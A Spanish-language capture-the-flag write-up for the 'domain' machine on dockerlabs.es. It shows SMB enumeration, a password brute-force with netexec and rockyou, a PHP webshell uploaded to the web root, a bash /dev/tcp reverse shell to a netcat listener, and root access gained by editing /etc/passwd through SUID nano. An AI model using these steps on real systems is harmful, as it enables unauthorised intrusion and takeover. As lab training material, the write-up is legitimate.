<p>Este es un reto clasificado como de dificultad easy de la plataforma dockerlabs.es .
Nos encontramos con las siguientes características y dificultades , en el tendremos que localizar la entrada al sistema , explotacion de samba , subir archivos por samba , envio de revshell y escalada de privelegios.</p>

<h2 id="herramientas-y-recursos-usados">HERRAMIENTAS Y RECURSOS USADOS</h2>

<ul>
  <li>nmap</li>
  <li>enum4linux</li>
  <li>netexec</li>
  <li>smbmap</li>
  <li>smbclient</li>
</ul>

<h2 id="enumeracion">Enumeracion</h2>

<p>Como al arrancar la maquina ya nos dice la ip nos olvidamos de arp-scan , comprobamos la conexion con un ping.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ping <span class="nt">-c1</span> 172.17.0.2
</code></pre></div></div>

<p>Ahora realizamos un nmap como de costumbre sin preocuparnos del ruido pues estamos en entorno de pruebas.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>nmap <span class="nt">-n</span> <span class="nt">-sV</span> <span class="nt">-sC</span> <span class="nt">-Pn</span> 172.17.0.2 <span class="nt">-oX</span> domain.xml
</code></pre></div></div>

<p><a href="r3p0rt3s/domain.html" title="Reporte nmap">Reporte</a></p>

<p>Observamos el resultado y vemos que solo tiene el 80 , el 139 y 445 abiertos .
Despues de revisar la web no encuentro nada asi que tendremos que enumerar samba y intentar extraer los usuarios.Puedes usar herramientas como enum4linux , smbmap , rpclient , metasploit …
Vamos a hacer uso de enum4linux el cual nos devuelve datos interesantes , los cuales nos sirven para avanzar como son los recursos compartidos y los usuarios.</p>

<p><img src="assets/img_domain/enum4linux.png" alt="enum4linux" /></p>

<p>Ahora probamos a hacer fuerza bruta contra samba dado que conocemos los usuarios hay muchas herrainetas para esto yo me decanto por netexec.</p>

<p>Ejecutamos.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>nxc smb 172.17.0.2 <span class="nt">--ignore-pw-decoding</span> <span class="nt">-u</span> bob <span class="nt">-p</span> /home/quino/rockyou.txt
</code></pre></div></div>

<p>y obtenemos la password</p>

<p><img src="assets/img_domain/nxc.png" alt="img nxc" /></p>

<p>Una vez con la password ejecutamos smbmap para corroborar si hay permisos de escritura en algun directorio</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smbmap <span class="nt">-u</span> bob <span class="nt">-p</span> star <span class="nt">-H</span> 172.17.0.
</code></pre></div></div>
<p><img src="assets/img_domain/corroborarpermisos.png" alt="smbmap" /></p>

<h2 id="infiltración">Infiltración</h2>

<p>Ahora que ya tenemos todo listo pasamos a conectarnos a la maquina para intentar colar un archivo e intentar ejecutarlo desde la web dado que la carperta de samba es la raiz www</p>

<p>Para ello utilizare smbclient indicandole el directorio que antes vimos que bob puede escribir</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smbclient //172.17.0.2/html <span class="nt">-U</span> bob
</code></pre></div></div>

<p>Una vez dentro listamos los archivos y efectivamente encontramos el index.html .</p>

<p><img src="assets/img_domain/conexionsmbclient.png" alt="smbclient" /></p>

<p>Asi que vamos a subir una webshell para reenviarnos un revshell.</p>

<p><img src="assets/img_domain/smbclientup.png" alt="subidawebshell" /></p>

<p>Accedemos a al php que hemos subido y ejecutamos una revshell , para ello antes nos ponemos en escucha con netcat.</p>

<p>Atacante</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>nc <span class="nt">-lvnp</span> 443
</code></pre></div></div>

<p>En la webshell</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash <span class="nt">-c</span> <span class="s2">"bash -i  &gt;&amp; /dev/tcp/192.168.0.112/443 0&gt;&amp;1"</span>
</code></pre></div></div>
<p>Resultado :</p>

<p><img src="assets/img_domain/netcat.png" alt="nc_ok" /></p>

<h2 id="escalada-de-privilegios">Escalada de privilegios</h2>

<p>Como siempre empezaremos por lo mas basico buscando ficheros con permisos erroneos scripts con suid gid….
En este caso con find tenemos suerte</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>find / <span class="nt">-perm</span> <span class="nt">-4000</span> 2&gt;/dev/null
</code></pre></div></div>
<p><img src="assets/img_domain/find.png" alt="find" /></p>

<p>Como vemos tenemos el procesdor de texto nano que podemos usar como superusuario asi que solo debemos editar el fichero que creamos mas conveniente para acceder al sitema.
El mas rapido y sencillo es editar /etc/passwd y eliminar la x de la linea root de ese moso no se nos pide contraseña cuando hacemos:</p>

<p><img src="assets/img_domain/editpasswd.png" alt="etcpasswd" /></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>su root
</code></pre></div></div>
<p><img src="assets/img_domain/root.png" alt="imgroot" /></p>

<p>Hasta aqui la maquina domain.
Gracias por leer</p>
